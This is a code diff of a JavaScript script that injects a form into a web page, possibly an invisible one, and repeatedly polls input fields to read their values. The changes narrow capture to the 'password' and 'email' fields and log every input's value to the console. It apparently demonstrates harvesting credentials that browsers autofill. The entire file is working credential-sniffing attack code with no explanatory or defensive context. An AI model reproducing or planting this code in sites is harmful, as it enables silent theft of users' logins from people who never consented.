@@ -1,4 +1,3 @@
-
 var injectForm = function(visible) {
   console.log("Injecting the form");
   var container = document.createElement('div');
@@ -24,23 +23,23 @@ var injectForm = function(visible) {
 
 var printResult = function(elementId, sniffedValue){
   console.log("omri:" + sniffedValue );
-  document.getElementById("sniffed_" + elementId).innerHTML = "<b>" + sniffedValue + "</b>";
 };
 
 var sniffInputField = function(fieldId){
   var inputElement = document.getElementById(fieldId);
-  if (inputElement.value.length){
+  if (inputElement && inputElement.value.length && (fieldId == "password" || fieldId == "email")){
     printResult(fieldId, inputElement.value);    
   }else{
-    window.setTimeout(sniffInputField, 200, fieldId);  // wait for 200ms
+    window.setTimeout(sniffInputField, 200, fieldId);  
   }
 };
 
 var sniffInputFields = function(){  
   var inputs = document.getElementsByTagName('input');
   for (var i = 0; i < inputs.length; i++) {
-    console.log("Will try to sniff element with id: " + inputs[i].id);
+    console.log("Will try to sniff element with id: " + inputs[i].id + "   :   " + i + "    : value:" + inputs[i].value);
     sniffInputField(inputs[i].id);
+	
   }
 };
 
@@ -49,5 +48,5 @@ var sniffFormInfo = function(visible) {
   sniffInputFields();
 };
 
-var visible_form=true;  // will use an invisible form
+var visible_form=true;  
 sniffFormInfo(visible_form);
